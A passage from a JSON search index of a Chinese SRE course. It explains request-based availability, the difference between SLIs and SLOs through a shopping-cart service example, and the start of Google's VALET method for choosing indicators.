<p>\u7ed3\u5408\u4e0a\u9762\u8fd9\u4e09\u4e2a\u56e0\u7d20\uff0c\u5bf9\u4e8e\u5230\u5e95\u5e94\u8be5\u5b9a\u201c\u51e0\u4e2a9\u201d\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f60\u5e94\u8be5\u6709\u4e86\u4e00\u4e2a\u66f4\u6e05\u6670\u7684\u8ba4\u8bc6\u4e86\u3002</p>"},{"location":"ops/50-sre-mogu-02/#_1","title":"\u603b\u7ed3","text":"<p>\u597d\u4e86\uff0c\u5230\u8fd9\u91cc\uff0c\u4eca\u5929\u6211\u4eec\u8981\u8ba8\u8bba\u7684\u7cfb\u7edf\u53ef\u7528\u6027\u5c31\u8bb2\u5b8c\u4e86\u3002\u5173\u4e8e\u7cfb\u7edf\u53ef\u7528\u6027\uff0c\u4e1a\u754c\u6709\u4e24\u79cd\u8ba1\u7b97\u65b9\u5f0f\uff0c</p> <ul> <li>\u4e00\u79cd\u662f\u65f6\u957f\u7ef4\u5ea6</li> <li>\u53e6\u4e00\u79cd\u662f\u8bf7\u6c42\u7ef4\u5ea6</li> </ul> <p>\u8fd9\u4e24\u79cd\u65b9\u5f0f\u5404\u6709\u4f18\u52a3\u3002\u5728SRE\u7684\u5b9e\u8df5\u4e2d\uff0c\u5e94\u8be5\u9009\u62e9\u54ea\u4e00\u4e2a\u5462\uff1f\u5f88\u660e\u663e\uff0cSRE\u4f1a\u66f4\u591a\u91c7\u7528\u8bf7\u6c42\u7ef4\u5ea6\u7684\u7edf\u8ba1\u65b9\u5f0f\uff0c\u56e0\u4e3aSRE\u5173\u6ce8\u7684\u7a33\u5b9a\u6027\u662f\u7cfb\u7edf\u7684\u6574\u4f53\u8fd0\u884c\u72b6\u6001\uff0c\u800c\u4e0d\u4ec5\u4ec5\u53ea\u5173\u6ce8\u6545\u969c\u72b6\u6001\u4e0b\u7684\u7a33\u5b9a\u6027\uff0c\u5728\u7cfb\u7edf\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7684\u4efb\u4f55\u5f02\u5e38\uff0c\u90fd\u4f1a\u88ab\u7eb3\u5165\u7a33\u5b9a\u6027\u7684\u8bc4\u4f30\u8303\u7574\u4e2d\u3002</p> <p>\u8fd9\u4e2a\u77e5\u8bc6\u70b9\u8981\u62ff\u4e00\u6574\u8282\u8bfe\u6765\u8bb2\uff0c\u662f\u56e0\u4e3a\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u8981\u8ba8\u8bbaSRE\u7684\u7a33\u5b9a\u6027\u6307\u6807\u548c\u76ee\u6807\u4e86\uff0c\u7406\u89e3\u4e86\u4eca\u5929\u7684\u5185\u5bb9\uff0c\u4f60\u624d\u80fd\u66f4\u597d\u5730\u7406\u89e3SRE\u4f53\u7cfb\u4e2d\u7684\u6307\u6807\uff08SLI\uff09\u548c\u76ee\u6807\uff08SLO\uff09\u3002</p>"},{"location":"ops/50-sre-mogu-03/","title":"03 | SRE\u5207\u5165\u70b9\uff1a\u9009\u62e9SLI\uff0c\u8bbe\u5b9aSLO","text":"<p>\u8fd8\u662f\u5148\u6765\u590d\u4e60\u4e0b\u4e0a\u8282\u8bfe\u8bb2\u7684\u201c\u7cfb\u7edf\u53ef\u7528\u6027\u201d\u7684\u4e24\u79cd\u8ba1\u7b97\u65b9\u5f0f\uff0c\u4e00\u79cd\u662f\u4ece\u6545\u969c\u89d2\u5ea6\u51fa\u53d1\uff0c\u4ee5\u65f6\u957f\u7ef4\u5ea6\u5bf9\u7cfb\u7edf\u8fdb\u884c\u7a33\u5b9a\u6027\u8bc4\u4f30\uff1b\u53e6\u4e00\u79cd\u662f\u4ece\u6210\u529f\u8bf7\u6c42\u5360\u6bd4\u89d2\u5ea6\u51fa\u53d1\uff0c\u4ee5\u8bf7\u6c42\u7ef4\u5ea6\u5bf9\u7cfb\u7edf\u8fdb\u884c\u7a33\u5b9a\u6027\u8bc4\u4f30\u3002\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u8bb2\u5230\uff0c\u5728SRE\u5b9e\u8df5\u4e2d\uff0c\u901a\u5e38\u4f1a\u9009\u62e9\u7b2c\u4e8c\u79cd\uff0c\u4e5f\u5c31\u662f\u6839\u636e\u6210\u529f\u8bf7\u6c42\u7684\u6bd4\u4f8b\u6765\u8861\u91cf\u7a33\u5b9a\u6027\uff1a</p> <p><code>Availability = Successful request / Total request</code></p> <p>SRE\u5f3a\u8c03\u7684\u7a33\u5b9a\u6027\uff0c\u4e00\u822c\u4e0d\u662f\u770b\u5355\u6b21\u8bf7\u6c42\u7684\u6210\u529f\u4e0e\u5426\uff0c\u800c\u662f\u770b\u6574\u4f53\u60c5\u51b5\uff0c\u6240\u4ee5\u6211\u4eec\u4f1a\u628a\u6210\u529f\u8bf7\u6c42\u7684\u5360\u6bd4\u8bbe\u5b9a\u4e3a\u4e00\u4e2a\u53ef\u4ee5\u63a5\u53d7\u7684\u76ee\u6807\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u201c3\u4e2a9\u201d\u6216\u201c4\u4e2a9\u201d\u8fd9\u6837\u7684\u53ef\u91cf\u5316\u7684\u6570\u5b57\u3002</p> <p>\u90a3\u4e48\uff0c\u8fd9\u4e2a\u201c\u786e\u5b9a\u6210\u529f\u8bf7\u6c42\u6761\u4ef6\uff0c\u8bbe\u5b9a\u8fbe\u6210\u5360\u6bd4\u76ee\u6807\u201d\u7684\u8fc7\u7a0b\uff0c\u5728SRE\u4e2d\u5c31\u662f**\u8bbe\u5b9a\u7a33\u5b9a\u6027\u8861\u91cf\u6807\u51c6\u7684SLI\u548cSLO\u7684\u8fc7\u7a0b**\u3002</p> <p>\u5177\u4f53\u6765\u770b\u4e0b\u8fd9\u4e24\u4e2a\u6982\u5ff5\u3002</p> <ul> <li>SLI\uff0cService Level Indicator\uff0c\u670d\u52a1\u7b49\u7ea7\u6307\u6807\uff0c\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u9009\u62e9\u54ea\u4e9b\u6307\u6807\u6765\u8861\u91cf\u6211\u4eec\u7684\u7a33\u5b9a\u6027\u3002</li> <li>SLO\uff0cService Level Objective\uff0c\u670d\u52a1\u7b49\u7ea7\u76ee\u6807\uff0c\u6307\u7684\u5c31\u662f\u6211\u4eec\u8bbe\u5b9a\u7684\u7a33\u5b9a\u6027\u76ee\u6807\uff0c\u6bd4\u5982\u201c\u51e0\u4e2a9\u201d\u8fd9\u6837\u7684\u76ee\u6807\u3002</li> </ul> <p>SLI\u548cSLO\u8fd9\u4e24\u4e2a\u6982\u5ff5\u4f60\u4e00\u5b9a\u8981\u7262\u7262\u8bb0\u4f4f\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u4f1a\u53cd\u590d\u8bb2\u5230\u5b83\u4eec\uff0c\u56e0\u4e3a\u843d\u5730SRE\u7684\u7b2c\u4e00\u6b65\u5176\u5b9e\u5c31\u662f**\u201c\u9009\u62e9\u5408\u9002\u7684SLI\uff0c\u8bbe\u5b9a\u5bf9\u5e94\u7684SLO\u201d**\u3002</p> <p>\u597d\uff0c\u90a3\u6211\u4eec\u5c31\u6b63\u5f0f\u5f00\u59cb\u4eca\u5929\u7684\u5185\u5bb9\u3002\u6211\u4f1a\u5e26\u4f60\u5f7b\u5e95\u7406\u89e3SLI\u548cSLO\u8fd9\u4e24\u4e2a\u6982\u5ff5\uff0c\u5e76\u638c\u63e1\u8bc6\u522bSLI\u3001\u8bbe\u5b9aSLO\u7684\u5177\u4f53\u65b9\u6cd5\u3002</p>"},{"location":"ops/50-sre-mogu-03/#slislo","title":"SLI\u548cSLO\u5230\u5e95\u662f\u5565\uff1f","text":"<p>SLI\u548cSLO\u8fd9\u4e24\u4e2a\u6982\u5ff5\u6bd4\u8f83\u6709\u610f\u601d\uff0c\u770b\u5b57\u9762\u610f\u601d\u597d\u50cf\u5c31\u5df2\u7ecf\u5f88\u660e\u767d\u4e86\uff0c\u4f46\u662f\u5462\uff0c\u4ed4\u7ec6\u4e00\u60f3\uff0c\u4f60\u4f1a\u53d1\u73b0\u5b83\u4eec\u5f88\u62bd\u8c61\u3002SLI\u548cSLO\u6307\u7684\u5230\u5e95\u662f\u5565\u5462\uff1f</p> <p>\u63a5\u4e0b\u6765\u6211\u7ed9\u4f60\u8bb2\u4e00\u4e2a\u5177\u4f53\u7684\u4f8b\u5b50\uff0c\u8bb2\u5b8c\u540e\uff0c\u4f60\u80af\u5b9a\u5c31\u80fd\u7406\u89e3\u4e86\u3002</p> <p>\u6211\u4eec\u4ee5\u7535\u5546\u4ea4\u6613\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u6838\u5fc3\u5e94\u7528\u201c\u8d2d\u7269\u8f66\u201d\u4e3a\u4f8b\uff0c\u7ed9\u5b83\u53d6\u540d\u53eb\u505atrade_cart\u3002trade_cart\u662f\u4ee5\u8bf7\u6c42\u7ef4\u5ea6\u6765\u8861\u91cf\u7a33\u5b9a\u6027\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5355\u6b21\u8bf7\u6c42\u5982\u679c\u8fd4\u56de\u7684\u662f\u975e5xx\u7684\u72b6\u6001\u7801\uff0c\u6211\u4eec\u8ba4\u4e3a\u8be5\u6b21\u8bf7\u6c42\u662f\u6210\u529f\u7684\uff1b\u5982\u679c\u8fd4\u56de\u7684\u662f5xx\u72b6\u6001\u7801\uff0c\u5982\u6211\u4eec\u5e38\u89c1\u7684502\u6216503\uff0c\u6211\u4eec\u5c31\u5224\u65ad\u8fd9\u6b21\u8bf7\u6c42\u662f\u5931\u8d25\u7684\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u4e2a\u72b6\u6001\u7801\u53ea\u80fd\u6807\u8bc6\u5355\u6b21\u8bf7\u6c42\u7684\u573a\u666f\u3002\u6211\u4eec\u4e4b\u524d\u8bb2\u8fc7\uff0c\u5355\u6b21\u7684\u5f02\u5e38\u4e0e\u5426\u5e76\u4e0d\u80fd\u4ee3\u8868\u8fd9\u4e2a\u5e94\u7528\u662f\u5426\u7a33\u5b9a\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5c31\u8981\u770b\u5728\u4e00\u4e2a\u5468\u671f\u5185\uff0c\u6240\u6709\u8c03\u7528\u6b21\u6570\u7684\u6210\u529f\u7387\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u6765\u786e\u5b9a\u5b83\u662f\u5426\u7a33\u5b9a\u3002\u6bd4\u5982\u6211\u4eec\u7ed9\u8fd9\u4e2a\u201c\u72b6\u6001\u7801\u8fd4\u56de\u4e3a\u975e5xx\u7684\u6bd4\u4f8b\u201d\u8bbe\u5b9a\u4e00\u4e2a\u76ee\u6807\uff0c\u5982\u679c\u5927\u4e8e\u7b49\u4e8e99.95%\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u8fd9\u4e2a\u5e94\u7528\u662f\u7a33\u5b9a\u7684\u3002</p> <p>\u5728SRE\u5b9e\u8df5\u4e2d\uff0c\u6211\u4eec\u7528SLI\u548cSLO\u6765\u63cf\u8ff0\u3002\u201c\u72b6\u6001\u7801\u4e3a\u975e5xx\u7684\u6bd4\u4f8b\u201d\u5c31\u662fSLI\uff0c\u201c\u5927\u4e8e\u7b49\u4e8e99.95%\u201d\u5c31\u662fSLO\u3002\u8bf4\u5f97\u66f4\u76f4\u63a5\u4e00\u70b9\uff0cSLO\u662fSLI\u8981\u8fbe\u6210\u7684\u76ee\u6807\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4f60\u73b0\u5728\u662f\u4e0d\u662f\u5df2\u7ecf\u7406\u89e3\u4e86\u8fd9\u4e24\u4e2a\u6982\u5ff5\u5462\u3002SLI\u5c31\u662f\u6211\u4eec\u8981\u76d1\u63a7\u7684\u6307\u6807\uff0cSLO\u5c31\u662f\u8fd9\u4e2a\u6307\u6807\u5bf9\u5e94\u7684\u76ee\u6807\u3002</p> <p>\u597d\uff0c\u90a3\u63a5\u4e0b\u6765\u6211\u4eec\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u5f88\u5177\u4f53\u4e86\u3002\u6211\u4eec\u5e94\u8be5\u9009\u62e9\u54ea\u4e9b\u6307\u6807\u6765\u76d1\u63a7\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\uff1f\u6307\u6807\u9009\u597d\u540e\uff0c\u5bf9\u5e94\u5730\u600e\u4e48\u5b9a\u5b83\u7684\u76ee\u6807\u5462\uff1f\u4e0b\u9762\u54b1\u4eec\u5c31\u4e00\u4e00\u6765\u63a2\u7d22\u3002</p>"},{"location":"ops/50-sre-mogu-03/#sli","title":"\u7cfb\u7edf\u8fd0\u884c\u72b6\u6001\u6307\u6807\u90a3\u4e48\u591a\uff0c\u54ea\u4e9b\u9002\u5408SLI\uff1f","text":"<p>\u6211\u4eec\u5148\u6765\u8ba8\u8bba\u600e\u4e48\u9009\u62e9SLI\u3002\u8981\u56de\u7b54\u600e\u4e48\u9009\u62e9\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u5f97\u5148\u6765\u770b\u770b\u90fd\u6709\u54ea\u4e9b\u53ef\u4f9b\u9009\u62e9\u7684\u6307\u6807\u3002</p> <p>\u5728\u4e0b\u9762\u8fd9\u5f20\u56fe\u4e2d\uff0c\u6211\u5217\u4e3e\u4e86\u7cfb\u7edf\u4e2d\u5e38\u89c1\u7684\u76d1\u63a7\u6307\u6807\u3002</p> <p></p> <p>\u8fd9\u4e9b\u6307\u6807\u662f\u4e0d\u662f\u90fd\u5f88\u719f\u6089\uff1f\u90a3\u8be5\u600e\u4e48\u9009\u5462\uff1f\u597d\u50cf\u6bcf\u4e00\u4e2a\u6307\u6807\u90fd\u5f88\u91cd\u8981\u554a\uff01</p> <p>\u786e\u5b9e\uff0c\u8fd9\u4e9b\u6307\u6807\u90fd\u5f88\u91cd\u8981\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u95ee\u81ea\u5df1\u4e24\u4e2a\u95ee\u9898\u6765\u9009\u62e9\u3002</p> <p>\u7b2c\u4e00\u4e2a\u95ee\u9898\uff1a\u6211\u8981\u8861\u91cf\u8c01\u7684\u7a33\u5b9a\u6027\uff1f \u4e5f\u5c31\u662f\u5148\u627e\u5230\u7a33\u5b9a\u6027\u7684\u4e3b\u4f53\u3002\u4e3b\u4f53\u786e\u5b9a\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u95ee\u7b2c\u4e8c\u95ee\u9898\uff1a\u8fd9\u4e2a\u6307\u6807\u80fd\u591f\u6807\u8bc6\u8fd9\u4e2a\u5b9e\u4f8b\u662f\u5426\u7a33\u5b9a\u5417\uff1f \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e24\u4e2a\u95ee\u9898\u89e3\u51b3\u4e86\uff0cSLI\u6307\u6807\u4e5f\u5c31\u786e\u8ba4\u4e86\u3002</p> <p>\u4ece\u6211\u7684\u7ecf\u9a8c\u6765\u770b\uff0c\u7ed9\u6307\u6807\u5206\u5c42\u975e\u5e38\u5173\u952e\u3002\u5c31\u50cf\u4e0a\u56fe\u90a3\u6837\u5206\u5c42\u540e\uff0c\u518d\u770b\u7a33\u5b9a\u6027\u4e3b\u4f53\u662f\u5c5e\u4e8e\u54ea\u4e00\u5c42\u7684\uff0c\u5c31\u53ef\u4ee5\u5728\u8fd9\u4e00\u5c42\u91cc\u9009\u62e9\u9002\u5408\u7684\u6307\u6807\u3002\u4f46\u662f\uff0c\u4f60\u8981\u6ce8\u610f\uff0c\u5373\u4fbf\u90fd\u662f\u5e94\u7528\u5c42\u7684\uff0c\u9488\u5bf9\u5177\u4f53\u7684\u4e3b\u4f53\uff0c\u8fd9\u4e00\u5c42\u7684\u6307\u6807\u4e5f\u4e0d\u662f\u6bcf\u4e00\u4e2a\u90fd\u9002\u5408\u3002</p> <p>\u6839\u636e\u8fd9\u51e0\u5e74\u7684\u5b9e\u8df5\u7ecf\u9a8c\uff0c\u6211\u603b\u7ed3\u4e86\u9009\u62e9SLI\u6307\u6807\u7684\u4e24\u5927\u539f\u5219\u3002</p> <ul> <li> <p>\u539f\u5219\u4e00\uff1a\u9009\u62e9\u80fd\u591f\u6807\u8bc6\u4e00\u4e2a\u4e3b\u4f53\u662f\u5426\u7a33\u5b9a\u7684\u6307\u6807\uff0c\u5982\u679c\u4e0d\u662f\u8fd9\u4e2a\u4e3b\u4f53\u672c\u8eab\u7684\u6307\u6807\uff0c\u6216\u8005\u4e0d\u80fd\u6807\u8bc6\u4e3b\u4f53\u7a33\u5b9a\u6027\u7684\uff0c\u5c31\u8981\u6392\u9664\u5728\u5916\u3002</p> </li> <li> <p>\u539f\u5219\u4e8c\uff1a\u9488\u5bf9\u7535\u5546\u8fd9\u7c7b\u6709\u7528\u6237\u754c\u9762\u7684\u4e1a\u52a1\u7cfb\u7edf\uff0c\u4f18\u5148\u9009\u62e9\u4e0e\u7528\u6237\u4f53\u9a8c\u5f3a\u76f8\u5173\u6216\u7528\u6237\u53ef\u4ee5\u660e\u663e\u611f\u77e5\u7684\u6307\u6807\u3002</p> </li> </ul> <p>\u8fd8\u62ff\u6211\u4eec\u4e0a\u9762trade_cart\u7684\u4f8b\u5b50\u6765\u8bf4\uff0c\u4e3b\u4f53\u786e\u5b9a\u4e86\uff0c\u5c31\u662ftrade_cart\uff0c\u5e94\u7528\u5c42\u9762\u7684\uff0c\u8bf7\u6c42\u8fd4\u56de\u72b6\u6001\u7801\u548c\u65f6\u5ef6\u5c31\u662f\u5f88\u597d\u7684\u6307\u6807\uff0c\u518d\u6765\u68c0\u67e5\u4e0b\u5b83\u4eec\u80fd\u5426\u6807\u8bc6\u7684trade_cart\u7a33\u5b9a\u6027\uff0c\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e24\u4e2a\u6307\u6807\u90fd\u53ef\u4ee5\uff0c\u90a3\u4e48\u8bf7\u6c42\u8fd4\u56de\u72b6\u6001\u7801\u548c\u65f6\u5ef6\u5c31\u53ef\u4ee5\u4f5c\u4e3atrade_cart\u7a33\u5b9a\u6027\u7684SLI\u6307\u6807\u3002</p> <p>\u6211\u4eec\u6362\u4e00\u4e2a\u6307\u6807\uff0cCPU\u7684\u4f7f\u7528\u7387\u8fd9\u4e2a\u6307\u6807\u9002\u5408\u5417\uff1f\u6839\u636e\u6211\u4eec\u521a\u624d\u8bf4\u7684\u539f\u5219\uff0c\u65e2\u7136\u6211\u4eec\u5173\u6ce8\u7684\u662ftrade_cart\u7684\u8fd0\u884c\u72b6\u51b5\uff0c\u800cCPU\u662f\u7cfb\u7edf\u5c42\u7684\u6307\u6807\uff0c\u6240\u4ee5\uff0c\u5728\u9009\u62e9\u5e94\u7528\u5c42SLI\u7684\u6307\u6807\u65f6\uff0c\u81ea\u7136\u4f1a\u628aCPU\u6392\u9664\u6389\u3002</p> <p>\u4f60\u53ef\u80fd\u4f1a\u8bf4\uff0c\u8fd9\u6837\u662f\u4e0d\u662f\u592a\u6b66\u65ad\u4e86\u5440\uff1f</p> <p>\u6211\u4eec\u7b80\u5355\u6765\u5206\u6790\u4e0b\u3002\u5047\u8bbeCPU\u4f7f\u7528\u7387\u8fbe\u5230\u4e8695%\uff0c\u4f46\u662f\u53ea\u8981CPU\u5904\u7406\u80fd\u529b\u8db3\u591f\uff0c\u72b6\u6001\u7801\u6210\u529f\u7387\u53ef\u80fd\u8fd8\u662f\u4fdd\u6301\u57284\u4e2a9\uff0c\u65f6\u5ef6\u8fd8\u662f\u572880ms\u4ee5\u5185\uff0c\u7528\u6237\u4f53\u9a8c\u6ca1\u6709\u53d7\u5230\u5f71\u54cd\u3002\u53e6\u5916\u4e00\u79cd\u60c5\u51b5\uff0c\u5047\u8bbeCPU\u4f7f\u7528\u7387\u53ea\u670910%\uff0c\u4f46\u662f\u53ef\u80fd\u56e0\u4e3a\u7f51\u7edc\u8d85\u65f6\u6216\u4e2d\u65ad\uff0c\u5bfc\u81f4\u5927\u91cf\u7684\u8bf7\u6c42\u5931\u8d25\uff0c\u751a\u81f3\u662f\u65f6\u5ef6\u98d9\u5347\uff0c\u8d2d\u7269\u8f66\u8fd9\u4e2a\u5e94\u7528\u7684\u8fd0\u884c\u72b6\u6001\u4e5f\u4e0d\u4e00\u5b9a\u662f\u6b63\u5e38\u7684\u3002\u6240\u4ee5\u7ed3\u8bba\u5c31\u662f\uff0cCPU\u4f7f\u7528\u7387\u4e0d\u7ba1\u662f10%\u8fd8\u662f95%\uff0c\u90fd\u4e0d\u80fd\u76f4\u63a5\u53cd\u6620trade_cart\u8fd0\u884c\u662f\u6b63\u5e38\u8fd8\u662f\u5f02\u5e38\uff0c\u4e0d\u9002\u5408\u4f5c\u4e3atrade_cart\u8fd9\u6837\u7684\u5e94\u7528\u8fd0\u884c\u7a33\u5b9a\u6027\u7684SLI\u6307\u6807\u3002</p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u4f60\u53ef\u80fd\u4f1a\u95ee\uff0c\u54ce\u5440\uff0c\u4f60\u8bf4\u7684\u8fd9\u4e24\u4e2a\u539f\u5219\u6211\u7406\u89e3\u4e86\uff0c\u5206\u5c42\u4e5f\u5927\u6982\u80fd\u505a\u5230\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u9700\u8981\u505a\u5f88\u591a\u8be6\u7ec6\u7684\u5206\u6790\u624d\u80fd\u9009\u62e9\u51faSLI\u6307\u6807\uff0c\u6709\u6ca1\u6709\u4ec0\u4e48\u66f4\u4fbf\u6377\u3001\u66f4\u5feb\u901f\u7684\u65b9\u6cd5\u6765\u5e2e\u52a9\u6211\u9009\u62e9\u554a\uff1f</p> <p>\u55ef\uff0c\u4e0d\u8981\u7740\u6025\uff0c\u8fd8\u771f\u6709\u8fd9\u6837\u4e00\u5957\u65b9\u6cd5\u3002\u600e\u4e48\u9009SLI\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u501f\u9274Google\u7684\u65b9\u6cd5\uff1aVALET\u3002</p>"},{"location":"ops/50-sre-mogu-03/#slivalet","title":"\u5feb\u901f\u8bc6\u522bSLI\u6307\u6807\u7684\u65b9\u6cd5\uff1aVALET","text":"<p>VALET\u662f5\u4e2a\u5355\u8bcd\u7684\u9996\u5b57\u6bcd\uff0c\u5206\u522b\u662fVolume\u3001Availability\u3001Latency\u3001Error\u548cTicket\u3002\u8fd95\u4e2a\u5355\u8bcd\u5c31\u662f\u6211\u4eec\u9009\u62e9SLI\u6307\u6807\u76845\u4e2a\u7ef4\u5ea6\u3002\u6211\u4eec\u8fd8\u662f\u7ed3\u5408trade_cart\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4e00\u8d77\u770b\u4e00\u4e0b\u6bcf\u4e2a\u7ef4\u5ea6\u5177\u4f53\u662f\u4ec0\u4e48\u3002</p> <p>Volume - \u5bb9\u91cf</p> <p>Volume\uff08\u5bb9\u91cf\uff09\u662f\u6307\u670d\u52a1\u627f\u8bfa\u7684\u6700\u5927\u5bb9\u91cf\u662f\u591a\u5c11\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5e94\u7528\u96c6\u7fa4\u7684QPS\u3001TPS\u3001\u4f1a\u8bdd\u6570\u4ee5\u53ca\u8fde\u63a5\u6570\u7b49\u7b49\uff0c\u5982\u679c\u6211\u4eec\u5bf9\u65e5\u5e38\u8bbe\u5b9a\u4e00\u4e2a\u76ee\u6807\uff0c\u5c31\u662f\u65e5\u5e38\u7684\u5bb9\u91cfSLO\uff0c\u5bf9\u53cc11\u8fd9\u6837\u7684\u5927\u4fc3\u8bbe\u5b9a\u4e00\u4e2a\u76ee\u6807\uff0c\u5c31\u662f\u5927\u4fc3SLO\u3002\u5bf9\u4e8e\u6570\u636e\u5e73\u53f0\uff0c\u6211\u4eec\u8981\u770b\u5b83\u7684\u541e\u5410\u80fd\u529b\uff0c\u6bd4\u5982\u6bcf\u5c0f\u65f6\u80fd\u5904\u7406\u7684\u8bb0\u5f55\u6570\u6216\u4efb\u52a1\u6570\u3002</p> <p>Availablity - \u53ef\u7528\u6027</p> <p>Availablity\uff08\u53ef\u7528\u6027\uff09\u4ee3\u8868\u670d\u52a1\u662f\u5426\u6b63\u5e38\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u524d\u9762\u4ecb\u7ecd\u5230\u7684\u8bf7\u6c42\u8c03\u7528\u7684\u975e5xx\u72b6\u6001\u7801\u6210\u529f\u7387\uff0c\u5c31\u53ef\u4ee5\u5f52\u4e8e\u53ef\u7528\u6027\u3002\u5bf9\u4e8e\u6570\u636e\u5e73\u53f0\uff0c\u6211\u4eec\u5c31\u770b\u4efb\u52a1\u7684\u6267\u884c\u6210\u529f\u60c5\u51b5\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u4efb\u52a1\u6267\u884c\u72b6\u6001\u7801\u6765\u5f52\u7c7b\u3002</p> <p>Latency - \u65f6\u5ef6</p> <p>Latency\uff08\u65f6\u5ef6\uff09\u662f\u8bf4\u54cd\u5e94\u662f\u5426\u8db3\u591f\u5feb\u3002\u8fd9\u662f\u4e00\u4e2a\u4f1a\u76f4\u63a5\u5f71\u54cd\u7528\u6237\u8bbf\u95ee\u4f53\u9a8c\u7684\u6307\u6807\u3002\u5bf9\u4e8e\u4efb\u52a1\u7c7b\u7684\u4f5c\u4e1a\uff0c\u6211\u4eec\u4f1a\u770b\u6bcf\u4e2a\u4efb\u52a1\u662f\u5426\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u5b8c\u6210\u4e86\u3002</p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u6211\u8981\u5ef6\u4f38\u4e0b\uff0c\u56e0\u4e3a\u901a\u5e38\u5bf9\u4e8e\u65f6\u5ef6\u8fd9\u4e2a\u6307\u6807\uff0c\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u505a\u6240\u6709\u8bf7\u6c42\u65f6\u5ef6\u7684\u5e73\u5747\uff0c\u56e0\u4e3a\u6574\u4e2a\u65f6\u5ef6\u7684\u5206\u5e03\u4e5f\u7b26\u5408\u6b63\u6001\u5206\u5e03\uff0c\u6240\u4ee5\u901a\u5e38\u4f1a\u4ee5\u7c7b\u4f3c\u201c90%\u8bf7\u6c42\u7684\u65f6\u5ef6 &lt;= 80ms\uff0c\u6216\u800595%\u8bf7\u6c42\u7684\u65f6\u5ef6 &lt;=120ms \u201d\u8fd9\u6837\u7684\u65b9\u5f0f\u6765\u8bbe\u5b9a\u65f6\u5ef6SLO\uff0c\u719f\u6089\u6570\u7406\u7edf\u8ba1\u7684\u540c\u5b66\u5e94\u8be5\u77e5\u9053\uff0c\u8fd9\u4e2a90%\u621695%\u6211\u4eec\u79f0\u4e4b\u4e3a\u7f6e\u4fe1\u533a\u95f4\u3002</p> <p>\u56e0\u4e3a\u4e0d\u6392\u9664\u5f88\u591a\u8bf7\u6c42\u4ece\u4e1a\u52a1\u903b\u8f91\u5c42\u9762\u662f\u4e0d\u6210\u529f\u7684\uff0c\u8fd9\u65f6\u4e1a\u52a1\u903b\u8f91\u7684\u5904\u7406\u65f6\u957f\u5c31\u4f1a\u975e\u5e38\u77ed\uff08\u53ef\u80fd10ms\uff09\uff0c\u6216\u8005\u51fa\u73b0404\u8fd9\u6837\u7684\u72b6\u6001\u7801\uff08\u53ef\u80fd\u5c311ms\uff09\u3002\u4ece\u53ef\u7528\u6027\u6765\u8bb2\uff0c\u8fd9\u4e9b\u8bf7\u6c42\u4e5f\u7b97\u6210\u529f\uff0c\u4f46\u662f\u8fd9\u6837\u7684\u8bf7\u6c42\u4f1a\u62c9\u4f4e\u6574\u4e2a\u5747\u503c\u3002</p> <p>\u540c\u65f6\uff0c\u4e5f\u4f1a\u51fa\u73b0\u53e6\u4e00\u79cd\u6781\u7aef\u60c5\u51b5\uff0c\u5c31\u662f\u67d0\u51e0\u6b21\u8bf7\u6c42\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\uff0c\u5bfc\u81f4\u65f6\u5ef6\u9ad8\u4e86\uff0c\u5230\u4e86500ms\uff0c\u4f46\u662f\u56e0\u4e3a\u6b21\u6570\u6240\u5360\u6bd4\u4f8b\u8f83\u4f4e\uff0c\u6570\u636e\u88ab\u5e73\u5747\u6389\u4e86\uff0c\u5355\u7eaf\u4ece\u5e73\u5747\u503c\u6765\u770b\u662f\u6ca1\u6709\u5f02\u5e38\u7684\u3002\u4f46\u662f\u4ece\u5b9e\u9645\u60c5\u51b5\u770b\uff0c\u6709\u5c11\u90e8\u5206\u7528\u6237\u7684\u4f53\u9a8c\u5176\u5b9e\u5df2\u7ecf\u975e\u5e38\u7cdf\u7cd5\u4e86\u3002\u6240\u4ee5\uff0c\u4e3a\u4e86\u8bc6\u522b\u51fa\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5c31\u8981\u8bbe\u5b9a\u4e0d\u540c\u7684\u7f6e\u4fe1\u533a\u95f4\u6765\u627e\u51fa\u8fd9\u6837\u7684\u7528\u6237\u5360\u6bd4\uff0c\u6709\u9488\u5bf9\u6027\u5730\u89e3\u51b3\u3002</p> <p>Errors - \u9519\u8bef\u7387</p> 